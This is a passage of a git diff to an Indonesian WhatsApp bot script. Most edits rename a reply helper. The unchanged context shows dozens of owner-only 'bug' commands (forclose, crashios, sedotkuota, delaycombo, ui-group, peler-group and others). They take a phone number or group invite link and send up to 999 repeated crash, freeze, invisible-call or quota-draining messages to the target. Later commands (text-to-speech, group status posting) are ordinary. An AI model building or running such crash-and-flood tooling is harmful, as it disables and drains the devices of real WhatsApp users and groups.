-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 90; i++) {
                    await InvisibleCall(target);
@@ -24009,7 +23982,7 @@ break
             }
             break;
             case 'ui-group2': {
-        if (!isCreator) return Reply(mess.owner)
+        if (!isCreator) return replyV1(mess.owner)
         await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
         for (let i = 0; i < 50; i++) {
             await UIGroupKontol(m.chat);
@@ -24017,18 +23990,18 @@ break
     }
     break;
 case 'ui-group': {
-    if (!isCreator) return Reply(mess.owner)
-    if (!q) return Reply(`Example: ${prefix + command} https://chat.whatsapp.com/ABCDEFG12345`);
+    if (!isCreator) return replyV1(mess.owner)
+    if (!q) return replyV1(`Example: ${prefix + command} https://chat.whatsapp.com/ABCDEFG12345`);
 
     if (!q.includes('chat.whatsapp.com')) {
-        return Reply("❌ Masukkan link grup WhatsApp yang valid.");
+        return replyV1("❌ Masukkan link grup WhatsApp yang valid.");
     }
 
     let inviteCode = q.split('chat.whatsapp.com/')[1].split('?')[0].split('/')[0].trim();
     
     let targetgroup = await conn.groupAcceptInvite(inviteCode);
     
-    await Reply("Sukses Attacks Group By Setyo");
+    await replyV1("Sukses Attacks Group By Setyo");
     
     for (let i = 0; i < 50; i++) {
         await UIGroupKontol(targetgroup);
@@ -24036,14 +24009,14 @@ case 'ui-group': {
 }
 break;
  case 'delayautoc1': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! sent delay invisible to ${target}`);
+                replyV1(`success! sent delay invisible to ${target}`);
                 
                  for (let i = 0; i < 10; i++) {
                    await CombinedExploit(target); 
@@ -24052,14 +24025,14 @@ break;
             }
             break;
 case 'delaycombo': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 900; i++) {
                    await SettoDelaycombo(target);
@@ -24070,14 +24043,14 @@ case 'delaycombo': {
             }
             break;
             case 'sedot-internal': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await ArsyilOfficialForceInvisble(conn, target);
@@ -24087,14 +24060,14 @@ case 'delaycombo': {
             }
             break;
             case 'forcloseios': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await ForceIphoneInvisible(target);
@@ -24104,14 +24077,14 @@ case 'delaycombo': {
             }
             break;
             case 'forclose1msg': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 1; i++) {
                    await ForcloseOneMSGV2(conn, target);
@@ -24120,14 +24093,14 @@ case 'delaycombo': {
             }
             break;
             case 'forclose': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 300; i++) {
                    await xCursedFC(conn, target);
@@ -24140,7 +24113,7 @@ case "con2":
 case "con3":
 case "con4": {
     try {
-        if (!isCreator) return Reply(mess.owner);
+        if (!isCreator) return replyV1(mess.owner);
 
         let text = m.message?.conversation 
             || m.message?.extendedTextMessage?.text 
@@ -24151,12 +24124,12 @@ case "con4": {
         let args = text.split(" ");
         let jidx = args[1];
 
-        if (!jidx) return Reply("❌ Target tidak ditemukan!");
+        if (!jidx) return replyV1("❌ Target tidak ditemukan!");
 
         jidx = jidx.replace(/[^0-9]/g, "");
         let target = `${jidx}@s.whatsapp.net`;
 
-        Reply(`✅ Menjalankan ${command.toUpperCase()} ke ${target}`);
+        replyV1(`✅ Menjalankan ${command.toUpperCase()} ke ${target}`);
 
         for (let i = 0; i < 50; i++) {
             await ArsyilSedotMemeg(conn, target);
@@ -24166,20 +24139,20 @@ case "con4": {
 
     } catch (e) {
         console.error(`Error ${command}:`, e);
-        Reply("❌ Error");
+        replyV1("❌ Error");
     }
 }
 break;
             case 'delaybebasspam':
             case 'sedotkuota': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 500; i++) {
                    await ArsyilSedotMemeg(conn, target);
@@ -24196,7 +24169,7 @@ break;
                 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                 await sleep(3500);
                 await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 
                 const args = String(m?.text || body || '').split(' ').slice(1);
                 const q = args[0] || '';
@@ -24204,10 +24177,10 @@ break;
     
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`);
-                if (jidx.length < 10) return Reply(`nomor tidak valid!`);
+                if (jidx.length < 10) return replyV1(`nomor tidak valid!`);
     
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);             
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);             
                 for (let i = 0; i < 5; i++) {
                     await CrashPacksNew(target); 
                 }
@@ -24215,14 +24188,14 @@ break;
             }
             break;    
                         case 'forcloseclick': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                     await ForceClickNewArsyilCynxo(target);
@@ -24234,14 +24207,14 @@ break;
             case 'crashsystem':
             case 'crashui':
             case 'blanknotif': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 200; i++) {
                     await OctoberNewUi(target);
@@ -24254,7 +24227,7 @@ break;
             break;
             case 'fcsaluran':
             case 'crashsaluran': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
         await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
         for (let i = 0; i < 300; i++) {
             await InvisibleSletterCrash(m.chat);
@@ -24263,9 +24236,9 @@ break;
     break;
     case 'spampairing':
     case 'spairing': {
-  if (!isCreator) return Reply(mess.owner)
-  if (!text) return Reply(`Example: ${prefix + command} +628xxxxxx|150`);
-  Reply('proses...');
+  if (!isCreator) return replyV1(mess.owner)
+  if (!text) return replyV1(`Example: ${prefix + command} +628xxxxxx|150`);
+  replyV1('proses...');
   let [peenis, pepekk = "200"] = text.split("|");
   let target = peenis.replace(/[^0-9]/g, '').trim();
   const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
@@ -24284,14 +24257,14 @@ break;
 break;
     case 'crashbeta':
     case 'spamcallvideo': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 999; i++) {
                    await ArsyilCynxoBetaFC(conn, target);
@@ -24299,14 +24272,14 @@ break;
                 console.log(chalk.red.bold("Success!"))
             }
             case 'forclose-blank': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return eply(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 100; i++) {
                    await CrashXFreeze(target);
@@ -24315,14 +24288,14 @@ break;
             }
             break;
             case 'crashios': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await await NullCrL(target);
@@ -24333,17 +24306,17 @@ break;
             }
             break;
 case 'peler-group': {
-    if (!isCreator) return Reply(mess.owner);
-    if (!q) return Reply(`Example: ${prefix + command} https://chat.whatsapp.com/ABCDEFG12345`);
+    if (!isCreator) return replyV1(mess.owner);
+    if (!q) return replyV1(`Example: ${prefix + command} https://chat.whatsapp.com/ABCDEFG12345`);
 
     if (!/^https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)(\?.*)?$/i.test(q.trim())) {
-    return Reply("❌ Masukkan link grup WhatsApp yang valid.");
+    return replyV1("❌ Masukkan link grup WhatsApp yang valid.");
 }
 
     const inviteCode = q.split("/").pop();
     const targetgroup = await conn.groupAcceptInvite(inviteCode);
 
-    await Reply("✅ Sukses KILL GROUP");
+    await replyV1("✅ Sukses KILL GROUP");
 
     for (let i = 0; i < 50; i++) {
         await ForceCrashPayment(targetgroup);
@@ -24353,7 +24326,7 @@ case 'peler-group': {
 break;
                       case 'seto-group':
                       case 'delay-group': {
-        if (!isCreator) return Reply(mess.owner)
+        if (!isCreator) return replyV1(mess.owner)
         await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
         for (let i = 0; i < 50; i++) {
             await CrashPacksNew(m.chat);
@@ -24364,7 +24337,7 @@ break;
     break;
                       case 'freeze-group':
                       case 'crash-group': {
-        if (!isCreator) return Reply(mess.owner)
+        if (!isCreator) return replyV1(mess.owner)
         await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
         for (let i = 0; i < 20; i++) {
             await CrashPacksNew(m.chat);
@@ -24374,14 +24347,14 @@ break;
     }
     break;
            case 'delayhard': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! sent delay invisible to ${target}`);
+                replyV1(`success! sent delay invisible to ${target}`);
                 
                  for (let i = 0; i < 50; i++) {
                    await inviscall(conn, target);
@@ -24393,14 +24366,14 @@ break;
             break;
             
            case 'blanknew': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 200; i++) {
                    await StuckBlank(target);
@@ -24412,14 +24385,14 @@ break;
             break;
 
            case 'forcenew': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await TesFc(target);
@@ -24443,7 +24416,7 @@ function extractId(url) {
 case "skipcode": {
     try {
         let [link, type] = text.split(" ");
-        if (!link.includes("github")) return Reply(`⚠️ Masukan Link Gits Code!
+        if (!link.includes("github")) return replyV1(`⚠️ Masukan Link Gits Code!
  \`--doc\` kirim pesan code pake document`);
 
         const id = extractId(link)
@@ -24464,18 +24437,18 @@ case "skipcode": {
                     quoted: m
                 })
             } else {
-                await Reply(file.content)
+                await replyV1(file.content)
             };
         };
 
     } catch (e) {
-        Reply("❌ Gomene Error Mungkin lu kebanyakan request");
+        replyV1("❌ Gomene Error Mungkin lu kebanyakan request");
         console.error(e);
     };
 };
 break
 case "tts": {
-    if (!text) return Reply("Contoh: .tts halo aku bot XnalzNotDev");
+    if (!text) return replyV1("Contoh: .tts halo aku bot XnalzNotDev");
 
     try {
         const axios = require("axios");
@@ -24500,12 +24473,12 @@ case "tts": {
 
     } catch (e) {
         console.log(e);
-        Reply("❌ Gagal convert text ke suara");
+        replyV1("❌ Gagal convert text ke suara");
     }
 }
 break
 case "ttsanime": {
-    if (!text) return Reply("Contoh: .ttsanime halo aku bot XnalzNotDev");
+    if (!text) return replyV1("Contoh: .ttsanime halo aku bot XnalzNotDev");
 
     try {
         const axios = require("axios");
@@ -24530,29 +24503,29 @@ case "ttsanime": {
 
     } catch (e) {
         console.log(e);
-        Reply("❌ Gagal convert text ke suara anime");
+        replyV1("❌ Gagal convert text ke suara anime");
     }
 }
 break;
 case "copyid": {
-    if (!text) return Reply("ID grup tidak ditemukan!");
-    await Reply(`📌 ID Grup:\n${text}`);
+    if (!text) return replyV1("ID grup tidak ditemukan!");
+    await replyV1(`📌 ID Grup:\n${text}`);
 }
 break;
 case "swgc2":
 case "swgrup2":
 case "swgroup2": {
-    if (!isCreator && !isAdmins) return Reply(mess.admin);
+    if (!isCreator && !isAdmins) return replyV1(mess.admin);
 
     const rawInput = String(text || '').trim();
     if (!rawInput) {
-        return Reply(`Contoh penggunaan:\n.swgrup2 1203630xxxxxxxx@g.us Halo semua\n\nUntuk media, reply gambar/video/audio lalu sertakan ID grup tujuan.`);
+        return replyV1(`Contoh penggunaan:\n.swgrup2 1203630xxxxxxxx@g.us Halo semua\n\nUntuk media, reply gambar/video/audio lalu sertakan ID grup tujuan.`);
     }
 
     const [idgc, ...captionParts] = rawInput.split(/\s+/);
     const caption = captionParts.join(' ').trim();
     if (!/^[^@\s]+@g\.us$/i.test(idgc || '')) {
-        return Reply('❌ ID grup tidak valid. Gunakan format lengkap yang berakhiran @g.us.');
+        return replyV1('❌ ID grup tidak valid. Gunakan format lengkap yang berakhiran @g.us.');
     }
 
     const quoted = m.quoted || m;
@@ -24566,10 +24539,10 @@ case "swgroup2": {
         try {
             targetMetadata = await getGroupMetadata(conn, idgc);
         } catch (error) {
-            return Reply(`❌ Bot tidak dapat mengakses grup tujuan. Periksa ID dan pastikan bot sudah bergabung.\nDetail: ${error?.message || error}`);
+            return replyV1(`❌ Bot tidak dapat mengakses grup tujuan. Periksa ID dan pastikan bot sudah bergabung.\nDetail: ${error?.message || error}`);
         }
         if (!targetMetadata) {
-            return Reply('❌ Metadata grup tujuan tidak tersedia. Coba lagi sebentar atau pastikan bot sudah bergabung.');
+            return replyV1('❌ Metadata grup tujuan tidak tersedia. Coba lagi sebentar atau pastikan bot sudah bergabung.');
         }
         const targetParticipants = Array.isArray(targetMetadata?.participants) ? targetMetadata.participants : [];
         const botIds = [conn.user?.id, conn.user?.lid, botNumber].filter(Boolean);
@@ -24577,7 +24550,7 @@ case "swgroup2": {
             getParticipantJids(participant).some(id => botIds.some(botJid => sameParticipantIdentity(id, botJid)))
         );
         if (!targetBotParticipant) {
-            return Reply('❌ Bot belum terdeteksi sebagai anggota grup tujuan. Masukkan bot ke grup tersebut terlebih dahulu.');
+            return replyV1('❌ Bot belum terdeteksi sebagai anggota grup tujuan. Masukkan bot ke grup tersebut terlebih dahulu.');
         }
 
         // Non-owner harus admin pada grup tujuan juga, bukan hanya grup tempat
@@ -24585,7 +24558,7 @@ case "swgroup2": {
         if (!isCreator) {
             const targetSender = targetParticipants.find(participant => participantMatchesMessage(participant, m));
             if (targetSender?.admin !== 'admin' && targetSender?.admin !== 'superadmin') {
-                return Reply('❌ Kamu harus menjadi admin pada grup tujuan untuk mengirim status ke sana.');
+                return replyV1('❌ Kamu harus menjadi admin pada grup tujuan untuk mengirim status ke sana.');
             }
         }
 
@@ -24605,7 +24578,7 @@ case "swgroup2": {
         } else if (finalCaption) {
             payload = { groupStatusMessage: { text: finalCaption } };
         } else {
-            return Reply(`❌ Reply gambar/video/audio atau masukkan teks status.\nContoh: .swgrup2 ${idgc} Halo semua`);
+            return replyV1(`❌ Reply gambar/video/audio atau masukkan teks status.\nContoh: .swgrup2 ${idgc} Halo semua`);
         }
 
         const sentStatus = await conn.sendMessage(idgc, payload);
@@ -24615,21 +24588,21 @@ case "swgroup2": {
         try {
             await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
         } catch {}
-        return Reply(`✅ Status grup berhasil dikirim ke ${targetMetadata?.subject || idgc}.`);
+        return replyV1(`✅ Status grup berhasil dikirim ke ${targetMetadata?.subject || idgc}.`);
     } catch (error) {
         console.error('[SWGRUP2/SWGC2 ERROR]', error?.stack || error);
-        return Reply(`❌ Gagal mengirim status grup.\nDetail: ${error?.message || error}`);
+        return replyV1(`❌ Gagal mengirim status grup.\nDetail: ${error?.message || error}`);
     }
 }
 break;
 case "cekid": {
-    if (!isCreator && !isAdmins) return Reply("Hanya admin/creator yang bisa menggunakan ini!");
+    if (!isCreator && !isAdmins) return replyV1("Hanya admin/creator yang bisa menggunakan ini!");
 
     // Ambil semua grup yang bot join
     let groups = await conn.groupFetchAllParticipating();
     let groupList = Object.values(groups);
 
-    if (!groupList.length) return Reply("Bot belum join grup apapun!");
+    if (!groupList.length) return replyV1("Bot belum join grup apapun!");
 
     // Preview 5 grup pertama biar nggak diem
     let preview = groupList.slice(0, 5).map((g, i) => `${i+1}. ${g.subject}`).join("\n");
@@ -24678,19 +24651,19 @@ case 'hapus-sw-grup':
 case 'hapusstatusgrup':
 case 'hapusswgc': {
     if (!isCreator && (!m.isGroup || !isAdmins)) {
-        return Reply('❌ Fitur ini hanya untuk owner atau admin grup.');
+        return replyV1('❌ Fitur ini hanya untuk owner atau admin grup.');
     }
 
     const requestedGroup = String(text || '').trim();
     const targetGroup = requestedGroup || (m.isGroup ? m.chat : '');
     if (!targetGroup) {
-        return Reply(`Contoh: ${prefix}delswgc 1203630xxxxxxxx@g.us\nGunakan di dalam grup untuk menghapus status grup terakhir tanpa ID.`);
+        return replyV1(`Contoh: ${prefix}delswgc 1203630xxxxxxxx@g.us\nGunakan di dalam grup untuk menghapus status grup terakhir tanpa ID.`);
     }
     if (!/^[^@\s]+@g\.us$/i.test(targetGroup)) {
-        return Reply('❌ ID grup tidak valid. Gunakan ID lengkap yang berakhiran @g.us.');
+        return replyV1('❌ ID grup tidak valid. Gunakan ID lengkap yang berakhiran @g.us.');
     }
     if (!isCreator && targetGroup !== m.chat) {
-        return Reply('❌ Admin hanya dapat menghapus status grup dari grup tempat command digunakan. Owner dapat menentukan ID grup lain.');
+        return replyV1('❌ Admin hanya dapat menghapus status grup dari grup tempat command digunakan. Owner dapat menentukan ID grup lain.');
     }
 
     const records = loadGroupStatusRecords();
@@ -24702,7 +24675,7 @@ case 'hapusswgc': {
         }
     }
     if (recordIndex < 0) {
-        return Reply('ℹ️ Belum ada status grup yang tercatat untuk grup ini. Status yang dikirim sebelum fitur ini dipasang tidak bisa dihapus oleh bot melalui command ini.');
+        return replyV1('ℹ️ Belum ada status grup yang tercatat untuk grup ini. Status yang dikirim sebelum fitur ini dipasang tidak bisa dihapus oleh bot melalui command ini.');
     }
 
     const record = records[recordIndex];
@@ -24717,16 +24690,16 @@ case 'hapusswgc': {
         await conn.sendMessage(record.groupJid, { delete: deleteKey });
         records.splice(recordIndex, 1);
         fs.writeFileSync(GROUP_STATUS_STORE, JSON.stringify(records, null, 2));
-        return Reply(`✅ Permintaan hapus status grup terakhir berhasil dikirim.\nGrup: ${record.groupJid}\nID status: ${record.id}`);
+        return replyV1(`✅ Permintaan hapus status grup terakhir berhasil dikirim.\nGrup: ${record.groupJid}\nID status: ${record.id}`);
     } catch (error) {
         console.error('[HAPUS SW GRUP ERROR]', error?.stack || error);
-        return Reply(`❌ Gagal menghapus status grup. WhatsApp/Baileys mungkin tidak mengizinkan penghapusan untuk tipe status ini.\nDetail: ${error?.message || error}`);
+        return replyV1(`❌ Gagal menghapus status grup. WhatsApp/Baileys mungkin tidak mengizinkan penghapusan untuk tipe status ini.\nDetail: ${error?.message || error}`);
     }
 }
 break;
 case "swgrup":
 case "swgc": {
-  if (!m.isGroup) return Reply(mess.group);
+  if (!m.isGroup) return replyV1(mess.group);
   const isQuoted = !!m.quoted;
   const mimetype = isQuoted
     ? String(m.quoted?.mimetype || m.quoted?.msg?.mimetype || m.quoted?.mime || m.quoted?.mtype || "").toLowerCase()
@@ -24762,7 +24735,7 @@ case "swgc": {
         ptt: false
       };
     } else {
-      return Reply(
+      return replyV1(
         "❌ Hanya bisa gambar, video, audio atau teks untuk status grup!"
       );
     }
@@ -24771,12 +24744,12 @@ case "swgc": {
       text: caption
     };
   } else {
-    return Reply(
+    return replyV1(
